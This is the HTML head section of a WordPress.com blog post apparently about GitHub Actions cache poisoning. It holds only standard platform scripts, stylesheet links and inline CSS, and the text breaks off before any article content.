<html lang="en"><head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="max-image-preview:large">

<!-- Async WordPress.com Remote Login -->
<script id="wpcom_remote_login_js">
var wpcom_remote_login_extra_auth = '';
function wpcom_remote_login_remove_dom_node_id( element_id ) {
	var dom_node = document.getElementById( element_id );
	if ( dom_node ) { dom_node.parentNode.removeChild( dom_node ); }
}
function wpcom_remote_login_remove_dom_node_classes( class_name ) {
	var dom_nodes = document.querySelectorAll( '.' + class_name );
	for ( var i = 0; i < dom_nodes.length; i++ ) {
		dom_nodes[ i ].parentNode.removeChild( dom_nodes[ i ] );
	}
}
function wpcom_remote_login_final_cleanup() {
	wpcom_remote_login_remove_dom_node_classes( "wpcom_remote_login_msg" );
	wpcom_remote_login_remove_dom_node_id( "wpcom_remote_login_key" );
	wpcom_remote_login_remove_dom_node_id( "wpcom_remote_login_validate" );
	wpcom_remote_login_remove_dom_node_id( "wpcom_remote_login_js" );
	wpcom_remote_login_remove_dom_node_id( "wpcom_request_access_iframe" );
	wpcom_remote_login_remove_dom_node_id( "wpcom_request_access_styles" );
}

// Watch for messages back from the remote login
window.addEventListener( "message", function( e ) {
	if ( e.origin === "https://r-login.wordpress.com" ) {
		var data = {};
		try {
			data = JSON.parse( e.data );
		} catch( e ) {
			wpcom_remote_login_final_cleanup();
			return;
		}

		if ( data.msg === 'LOGIN' ) {
			// Clean up the login check iframe
			wpcom_remote_login_remove_dom_node_id( "wpcom_remote_login_key" );

			var id_regex = new RegExp( /^[0-9]+$/ );
			var token_regex = new RegExp( /^.*|.*|.*$/ );
			if (
				token_regex.test( data.token )
				&& id_regex.test( data.wpcomid )
			) {
				// We have everything we need to ask for a login
				var script = document.createElement( "script" );
				script.setAttribute( "id", "wpcom_remote_login_validate" );
				script.src = '/remote-login.php?wpcom_remote_login=validate'
					+ '&wpcomid=' + data.wpcomid
					+ '&token=' + encodeURIComponent( data.token )
					+ '&host=' + window.location.protocol
					+ '//' + window.location.hostname
					+ '&postid=454'
					+ '&is_singular=1';
				document.body.appendChild( script );
			}

			return;
		}

		// Safari ITP, not logged in, so redirect
		if ( data.msg === 'LOGIN-REDIRECT' ) {
			window.location = 'https://wordpress.com/log-in?redirect_to=' + window.location.href;
			return;
		}

		// Safari ITP, storage access failed, remove the request
		if ( data.msg === 'LOGIN-REMOVE' ) {
			var css_zap = 'html { -webkit-transition: margin-top 1s; transition: margin-top 1s; } /* 9001 */ html { margin-top: 0 !important; } * html body { margin-top: 0 !important; } @media screen and ( max-width: 782px ) { html { margin-top: 0 !important; } * html body { margin-top: 0 !important; } }';
			var style_zap = document.createElement( 'style' );
			style_zap.type = 'text/css';
			style_zap.appendChild( document.createTextNode( css_zap ) );
			document.body.appendChild( style_zap );

			var e = document.getElementById( 'wpcom_request_access_iframe' );
			e.parentNode.removeChild( e );

			document.cookie = 'wordpress_com_login_access=denied; path=/; max-age=31536000';

			return;
		}

		// Safari ITP
		if ( data.msg === 'REQUEST_ACCESS' ) {
			console.log( 'request access: safari' );

			// Check ITP iframe enable/disable knob
			if ( wpcom_remote_login_extra_auth !== 'safari_itp_iframe' ) {
				return;
			}

			// If we are in a "private window" there is no ITP.
			var private_window = false;
			try {
				var opendb = window.openDatabase( null, null, null, null );
			} catch( e ) {
				private_window = true;
			}

			if ( private_window ) {
				console.log( 'private window' );
				return;
			}

			var iframe = document.createElement( 'iframe' );
			iframe.id = 'wpcom_request_access_iframe';
			iframe.setAttribute( 'scrolling', 'no' );
			iframe.setAttribute( 'sandbox', 'allow-storage-access-by-user-activation allow-scripts allow-same-origin allow-top-navigation-by-user-activation' );
			iframe.src = 'https://r-login.wordpress.com/remote-login.php?wpcom_remote_login=request_access&origin=' + encodeURIComponent( data.origin ) + '&wpcomid=' + encodeURIComponent( data.wpcomid );

			var css = 'html { -webkit-transition: margin-top 1s; transition: margin-top 1s; } /* 9001 */ html { margin-top: 46px !important; } * html body { margin-top: 46px !important; } @media screen and ( max-width: 660px ) { html { margin-top: 71px !important; } * html body { margin-top: 71px !important; } #wpcom_request_access_iframe { display: block; height: 71px !important; } } #wpcom_request_access_iframe { border: 0px; height: 46px; position: fixed; top: 0; left: 0; width: 100%; min-width: 100%; z-index: 99999; background: #23282d; } ';

			var style = document.createElement( 'style' );
			style.type = 'text/css';
			style.id = 'wpcom_request_access_styles';
			style.appendChild( document.createTextNode( css ) );
			document.body.appendChild( style );

			document.body.appendChild( iframe );
		}

		if ( data.msg === 'DONE' ) {
			wpcom_remote_login_final_cleanup();
		}
	}
}, false );

// Inject the remote login iframe after the page has had a chance to load
// more critical resources
window.addEventListener( "DOMContentLoaded", function( e ) {
	var iframe = document.createElement( "iframe" );
	iframe.style.display = "none";
	iframe.setAttribute( "scrolling", "no" );
	iframe.setAttribute( "id", "wpcom_remote_login_key" );
	iframe.src = "https://r-login.wordpress.com/remote-login.php"
		+ "?wpcom_remote_login=key"
		+ "&origin=aHR0cHM6Ly9hZG5hbnRoZWtoYW4uY29t"
		+ "&wpcomid=227025655"
		+ "&time=1718319792";
	document.body.appendChild( iframe );
}, false );
</script>
<title>The Monsters in Your Build Cache – GitHub Actions Cache Poisoning – Adnan Khan's Blog</title>
<link rel="dns-prefetch" href="//s0.wp.com">
<link rel="dns-prefetch" href="//widgets.wp.com">
<link rel="dns-prefetch" href="//wordpress.com">
<link rel="alternate" type="application/rss+xml" title="Adnan Khan's Blog » Feed" href="https://adnanthekhan.com/feed/">
<link rel="alternate" type="application/rss+xml" title="Adnan Khan's Blog » Comments Feed" href="https://adnanthekhan.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Adnan Khan's Blog » The Monsters in Your Build Cache – GitHub Actions Cache&nbsp;Poisoning Comments Feed" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/feed/">
	<script type="text/javascript">
		/* <![CDATA[ */
		function addLoadEvent(func) {
			var oldonload = window.onload;
			if (typeof window.onload != 'function') {
				window.onload = func;
			} else {
				window.onload = function () {
					oldonload();
					func();
				}
			}
		}
		/* ]]> */
	</script>
	<script>
window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s0.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1710334132i&ver=6.6-beta2-58393"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
</script>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-0-1" href="https://s0.wp.com/_static/??-eJxtzFsKgCAQQNENZaMg+BWtRXQI39KMtP0ogiD6PHC5cHThWmWsDGWInscWKkFE7talx0CjQml+ZCTYMVtGL3oj/mh2RBP8H3NI+H5vXflaFmWU0VJLo+MJKT40cA==&amp;cssminify=yes" type="text/css" media="all">
<link crossorigin="anonymous" rel="stylesheet" id="all-css-2-1" href="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/block-library/blocks/social-links/style.css?m=1716578158i&amp;cssminify=yes" type="text/css" media="all">
<style id="wp-block-search-inline-css">
.wp-block-search__button{margin-left:10px;word-break:normal}.wp-block-search__button.has-icon{line-height:0}.wp-block-search__button svg{fill:currentColor;height:1.25em;min-height:24px;min-width:24px;vertical-align:text-bottom;width:1.25em}:where(.wp-block-search__button){border:1px solid #ccc;padding:6px 10px}.wp-block-search__inside-wrapper{display:flex;flex:auto;flex-wrap:nowrap;max-width:100%}.wp-block-search__label{width:100%}.wp-block-search__input{-webkit-appearance:initial;appearance:none;border:1px solid #949494;flex-grow:1;margin-left:0;margin-right:0;min-width:3rem;padding:8px;text-decoration:unset!important}.wp-block-search.wp-block-search__button-only .wp-block-search__button{flex-shrink:0;margin-left:0;max-width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__button[aria-expanded=true]{max-width:calc(100% - 100px)}.wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{min-width:0!important;transition-property:width}.wp-block-search.wp-block-search__button-only .wp-block-search__input{flex-basis:100%;transition-duration:.3s}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden,.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__inside-wrapper{overflow:hidden}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__input{border-left-width:0!important;border-right-width:0!important;flex-basis:0;flex-grow:0;margin:0;min-width:0!important;padding-left:0!important;padding-right:0!important;width:0!important}:where(.wp-block-search__input){font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-transform:inherit}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper){border:1px solid #949494;box-sizing:border-box;padding:4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input{border:none;border-radius:0;padding:0 4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input:focus{outline:none}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) :where(.wp-block-search__button){padding:4px 8px}.wp-block-search.aligncenter .wp-block-search__inside-wrapper{margin:auto}.wp-block[data-align=right] .wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{float:right}
</style>
<style id="wp-block-group-inline-css">
.wp-block-group{box-sizing:border-box}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}
</style>
<style id="wp-block-columns-inline-css">
.wp-block-columns{align-items:normal!important;box-sizing:border-box;display:flex;flex-wrap:wrap!important}@media (min-width:782px){.wp-block-columns{flex-wrap:nowrap!important}}.wp-block-columns.are-vertically-aligned-top{align-items:flex-start}.wp-block-columns.are-vertically-aligned-center{align-items:center}.wp-block-columns.are-vertically-aligned-bottom{align-items:flex-end}@media (max-width:781px){.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column{flex-basis:100%!important}}@media (min-width:782px){.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column{flex-basis:0;flex-grow:1}.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column[style*=flex-basis]{flex-grow:0}}.wp-block-columns.is-not-stacked-on-mobile{flex-wrap:nowrap!important}.wp-block-columns.is-not-stacked-on-mobile>.wp-block-column{flex-basis:0;flex-grow:1}.wp-block-columns.is-not-stacked-on-mobile>.wp-block-column[style*=flex-basis]{flex-grow:0}:where(.wp-block-columns){margin-bottom:1.75em}:where(.wp-block-columns.has-background){padding:1.25em 2.375em}.wp-block-column{flex-grow:1;min-width:0;overflow-wrap:break-word;word-break:break-word}.wp-block-column.is-vertically-aligned-top{align-self:flex-start}.wp-block-column.is-vertically-aligned-center{align-self:center}.wp-block-column.is-vertically-aligned-bottom{align-self:flex-end}.wp-block-column.is-vertically-aligned-stretch{align-self:stretch}.wp-block-column.is-vertically-aligned-bottom,.wp-block-column.is-vertically-aligned-center,.wp-block-column.is-vertically-aligned-top{width:100%}
</style>
<style id="wp-block-site-logo-inline-css">
.wp-block-site-logo{box-sizing:border-box;line-height:0}.wp-block-site-logo a{display:inline-block;line-height:0}.wp-block-site-logo.is-default-size img{height:auto;width:120px}.wp-block-site-logo img{height:auto;max-width:100%}.wp-block-site-logo a,.wp-block-site-logo img{border-radius:inherit}.wp-block-site-logo.aligncenter{margin-left:auto;margin-right:auto;text-align:center}.wp-block-site-logo.is-style-rounded{border-radius:9999px}
</style>
<style id="wp-block-site-title-inline-css">
.wp-block-site-title a{color:inherit}
</style>
<style id="wp-block-page-list-inline-css">
.wp-block-navigation .wp-block-page-list{align-items:var(--navigation-layout-align,initial);background-color:inherit;display:flex;flex-direction:var(--navigation-layout-direction,initial);flex-wrap:var(--navigation-layout-wrap,wrap);justify-content:var(--navigation-layout-justify,initial)}.wp-block-navigation .wp-block-navigation-item{background-color:inherit}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-16-1" href="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/block-library/blocks/navigation/style.css?m=1716578158i&amp;cssminify=yes" type="text/css" media="all">
<style id="wp-block-post-terms-inline-css">
.wp-block-post-terms{box-sizing:border-box}.wp-block-post-terms .wp-block-post-terms__separator{white-space:pre-wrap}
</style>
<style id="wp-block-post-title-inline-css">
.wp-block-post-title{box-sizing:border-box;word-break:break-word}.wp-block-post-title a{display:inline-block}
</style>
<style id="wp-block-paragraph-inline-css">
.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}p.has-background{padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
</style>
<style id="wp-block-post-author-inline-css">
.wp-block-post-author{display:flex;flex-wrap:wrap}.wp-block-post-author__byline{font-size:.5em;margin-bottom:0;margin-top:0;width:100%}.wp-block-post-author__avatar{margin-right:1em}.wp-block-post-author__bio{font-size:.7em;margin-bottom:.7em}.wp-block-post-author__content{flex-basis:0;flex-grow:1}.wp-block-post-author__name{margin:0}
</style>
<style id="wp-block-post-date-inline-css">
.wp-block-post-date{box-sizing:border-box}
</style>
<style id="wp-block-post-featured-image-inline-css">
.wp-block-post-featured-image{margin-left:0;margin-right:0}.wp-block-post-featured-image a{display:block;height:100%}.wp-block-post-featured-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom;width:100%}.wp-block-post-featured-image.alignfull img,.wp-block-post-featured-image.alignwide img{width:100%}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim{background-color:#000;inset:0;position:absolute}.wp-block-post-featured-image{position:relative}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-gradient{background-color:initial}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-0{opacity:0}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-10{opacity:.1}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-20{opacity:.2}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-30{opacity:.3}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-40{opacity:.4}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-50{opacity:.5}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-60{opacity:.6}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-70{opacity:.7}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-80{opacity:.8}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-90{opacity:.9}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-100{opacity:1}.wp-block-post-featured-image:where(.alignleft,.alignright){width:100%}
</style>
<style id="wp-block-post-time-to-read-inline-css">
.wp-block-post-time-to-read{box-sizing:border-box}
</style>
<style id="wp-block-heading-inline-css">
h1.has-background,h2.has-background,h3.has-background,h4.has-background,h5.has-background,h6.has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-38-1" href="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/block-library/blocks/image/style.css?m=1716578158i&amp;cssminify=yes" type="text/css" media="all">
<style id="wp-block-list-inline-css">
ol,ul{box-sizing:border-box}ol.has-background,ul.has-background{padding:1.25em 2.375em}
</style>
<style id="wp-block-quote-inline-css">
.wp-block-quote{box-sizing:border-box;overflow-wrap:break-word}.wp-block-quote.is-large:where(:not(.is-style-plain)),.wp-block-quote.is-style-large:where(:not(.is-style-plain)){margin-bottom:1em;padding:0 1em}.wp-block-quote.is-large:where(:not(.is-style-plain)) p,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) p{font-size:1.5em;font-style:italic;line-height:1.6}.wp-block-quote.is-large:where(:not(.is-style-plain)) cite,.wp-block-quote.is-large:where(:not(.is-style-plain)) footer,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) cite,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) footer{font-size:1.125em;text-align:right}.wp-block-quote>cite{display:block}
</style>
<style id="wp-block-code-inline-css">
.wp-block-code{box-sizing:border-box}.wp-block-code code{display:block;font-family:inherit;overflow-wrap:break-word;white-space:pre-wrap}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-46-1" href="https://s0.wp.com/_static/??-eJydjEEKgCAQAD+UrR6KLtFbTJfQdJXWxe9HUB/oOMMw0KtyhRpSgyyqJjkCMURs1brzZWAhyMVLQgZnryKMCbiHipfahXzC0TEP8H/2NZ94fltezbxMxkx61vEGx+U/hQ==&amp;cssminify=yes" type="text/css" media="all">
<style id="wp-block-avatar-inline-css">
.wp-block-avatar{line-height:0}.wp-block-avatar,.wp-block-avatar img{box-sizing:border-box}.wp-block-avatar.aligncenter{text-align:center}
</style>
<style id="wp-block-comment-content-inline-css">
.comment-awaiting-moderation{display:block;font-size:.875em;line-height:1.5}
</style>
<style id="wp-block-comment-template-inline-css">
.wp-block-comment-template{box-sizing:border-box;list-style:none;margin-bottom:0;max-width:100%;padding:0}.wp-block-comment-template li{clear:both}.wp-block-comment-template ol{list-style:none;margin-bottom:0;max-width:100%;padding-left:2rem}.wp-block-comment-template.alignleft{float:left}.wp-block-comment-template.aligncenter{margin-left:auto;margin-right:auto;width:-moz-fit-content;width:fit-content}.wp-block-comment-template.alignright{float:right}
</style>
<style id="wp-block-comments-pagination-inline-css">
.wp-block-comments-pagination>.wp-block-comments-pagination-next,.wp-block-comments-pagination>.wp-block-comments-pagination-numbers,.wp-block-comments-pagination>.wp-block-comments-pagination-previous{margin-bottom:.5em;margin-right:.5em}.wp-block-comments-pagination>.wp-block-comments-pagination-next:last-child,.wp-block-comments-pagination>.wp-block-comments-pagination-numbers:last-child,.wp-block-comments-pagination>.wp-block-comments-pagination-previous:last-child{margin-right:0}.wp-block-comments-pagination .wp-block-comments-pagination-previous-arrow{display:inline-block;margin-right:1ch}.wp-block-comments-pagination .wp-block-comments-pagination-previous-arrow:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-comments-pagination .wp-block-comments-pagination-next-arrow{display:inline-block;margin-left:1ch}.wp-block-comments-pagination .wp-block-comments-pagination-next-arrow:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-comments-pagination.aligncenter{justify-content:center}
</style>
<style id="wp-block-post-comments-form-inline-css">
.wp-block-post-comments-form{box-sizing:border-box}.wp-block-post-comments-form[style*=font-weight] :where(.comment-reply-title){font-weight:inherit}.wp-block-post-comments-form[style*=font-family] :where(.comment-reply-title){font-family:inherit}.wp-block-post-comments-form[class*=-font-size] :where(.comment-reply-title),.wp-block-post-comments-form[style*=font-size] :where(.comment-reply-title){font-size:inherit}.wp-block-post-comments-form[style*=line-height] :where(.comment-reply-title){line-height:inherit}.wp-block-post-comments-form[style*=font-style] :where(.comment-reply-title){font-style:inherit}.wp-block-post-comments-form[style*=letter-spacing] :where(.comment-reply-title){letter-spacing:inherit}.wp-block-post-comments-form input[type=submit]{box-shadow:none;cursor:pointer;display:inline-block;overflow-wrap:break-word;text-align:center}.wp-block-post-comments-form input:not([type=submit]),.wp-block-post-comments-form textarea{border:1px solid #949494;font-family:inherit;font-size:1em}.wp-block-post-comments-form input:not([type=submit]):not([type=checkbox]),.wp-block-post-comments-form textarea{padding:calc(.667em + 2px)}.wp-block-post-comments-form .comment-form input:not([type=submit]):not([type=checkbox]):not([type=hidden]),.wp-block-post-comments-form .comment-form textarea{box-sizing:border-box;display:block;width:100%}.wp-block-post-comments-form .comment-form-author label,.wp-block-post-comments-form .comment-form-email label,.wp-block-post-comments-form .comment-form-url label{display:block;margin-bottom:.25em}.wp-block-post-comments-form .comment-form-cookies-consent{display:flex;gap:.25em}.wp-block-post-comments-form .comment-form-cookies-consent #wp-comment-cookies-consent{margin-top:.35em}.wp-block-post-comments-form .comment-reply-title{margin-bottom:0}.wp-block-post-comments-form .comment-reply-title :where(small){font-size:var(--wp--preset--font-size--medium,smaller);margin-left:.5em}
</style>
<style id="wp-block-buttons-inline-css">
.wp-block-buttons.is-vertical{flex-direction:column}.wp-block-buttons.is-vertical>.wp-block-button:last-child{margin-bottom:0}.wp-block-buttons>.wp-block-button{display:inline-block;margin:0}.wp-block-buttons.is-content-justification-left{justify-content:flex-start}.wp-block-buttons.is-content-justification-left.is-vertical{align-items:flex-start}.wp-block-buttons.is-content-justification-center{justify-content:center}.wp-block-buttons.is-content-justification-center.is-vertical{align-items:center}.wp-block-buttons.is-content-justification-right{justify-content:flex-end}.wp-block-buttons.is-content-justification-right.is-vertical{align-items:flex-end}.wp-block-buttons.is-content-justification-space-between{justify-content:space-between}.wp-block-buttons.aligncenter{text-align:center}.wp-block-buttons:not(.is-content-justification-space-between,.is-content-justification-right,.is-content-justification-left,.is-content-justification-center) .wp-block-button.aligncenter{margin-left:auto;margin-right:auto;width:100%}.wp-block-buttons[style*=text-decoration] .wp-block-button,.wp-block-buttons[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-button.aligncenter{text-align:center}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-74-1" href="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/block-library/blocks/button/style.css?m=1716578158i&amp;cssminify=yes" type="text/css" media="all">
<style id="wp-block-comments-inline-css">
.wp-block-post-comments{box-sizing:border-box}.wp-block-post-comments .alignleft{float:left}.wp-block-post-comments .alignright{float:right}.wp-block-post-comments .navigation:after{clear:both;content:"";display:table}.wp-block-post-comments .commentlist{clear:both;list-style:none;margin:0;padding:0}.wp-block-post-comments .commentlist .comment{min-height:2.25em;padding-left:3.25em}.wp-block-post-comments .commentlist .comment p{font-size:1em;line-height:1.8;margin:1em 0}.wp-block-post-comments .commentlist .children{list-style:none;margin:0;padding:0}.wp-block-post-comments .comment-author{line-height:1.5}.wp-block-post-comments .comment-author .avatar{border-radius:1.5em;display:block;float:left;height:2.5em;margin-right:.75em;margin-top:.5em;width:2.5em}.wp-block-post-comments .comment-author cite{font-style:normal}.wp-block-post-comments .comment-meta{font-size:.875em;line-height:1.5}.wp-block-post-comments .comment-meta b{font-weight:400}.wp-block-post-comments .comment-meta .comment-awaiting-moderation{display:block;margin-bottom:1em;margin-top:1em}.wp-block-post-comments .comment-body .commentmetadata{font-size:.875em}.wp-block-post-comments .comment-form-author label,.wp-block-post-comments .comment-form-comment label,.wp-block-post-comments .comment-form-email label,.wp-block-post-comments .comment-form-url label{display:block;margin-bottom:.25em}.wp-block-post-comments .comment-form input:not([type=submit]):not([type=checkbox]),.wp-block-post-comments .comment-form textarea{box-sizing:border-box;display:block;width:100%}.wp-block-post-comments .comment-form-cookies-consent{display:flex;gap:.25em}.wp-block-post-comments .comment-form-cookies-consent #wp-comment-cookies-consent{margin-top:.35em}.wp-block-post-comments .comment-reply-title{margin-bottom:0}.wp-block-post-comments .comment-reply-title :where(small){font-size:var(--wp--preset--font-size--medium,smaller);margin-left:.5em}.wp-block-post-comments .reply{font-size:.875em;margin-bottom:1.4em}.wp-block-post-comments input:not([type=submit]),.wp-block-post-comments textarea{border:1px solid #949494;font-family:inherit;font-size:1em}.wp-block-post-comments input:not([type=submit]):not([type=checkbox]),.wp-block-post-comments textarea{padding:calc(.667em + 2px)}:where(.wp-block-post-comments input[type=submit]){border:none}
</style>
<style id="wp-block-post-navigation-link-inline-css">
.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-previous{display:inline-block;margin-right:1ch}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-previous:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-next{display:inline-block;margin-left:1ch}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-next:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-post-navigation-link.has-text-align-left[style*="writing-mode: vertical-lr"],.wp-block-post-navigation-link.has-text-align-right[style*="writing-mode: vertical-rl"]{rotate:180deg}
</style>
<style id="wp-block-spacer-inline-css">
.wp-block-spacer{clear:both}
</style>
<style id="wp-emoji-styles-inline-css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link crossorigin="anonymous" rel="stylesheet" id="all-css-84-1" href="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/block-library/common.css?m=1716578158i&amp;cssminify=yes" type="text/css" media="all">
<style id="wp-block-library-inline-css">
.has-text-align-justify {
	text-align:justify;
}
.wp-block-cover__image-background.has-parallax {
	background-size: cover;
}
.has-text-align-justify{text-align:justify;}
</style>
<style id="wp-block-template-skip-link-inline-css">

		.skip-link.screen-reader-text {
			border: 0;
			clip: rect(1px,1px,1px,1px);
			clip-path: inset(50%);
			height: 1px;
			margin: -1px;
			overflow: hidden;
			padding: 0;
			position: absolute !important;
			width: 1px;
			word-wrap: normal !important;
		}

		.skip-link.screen-reader-text:focus {
			background-color: #eee;
			clip: auto !important;
			clip-path: none;
			color: #444;
			display: block;
			font-size: 1em;
			height: auto;
			left: 5px;
			line-height: normal;
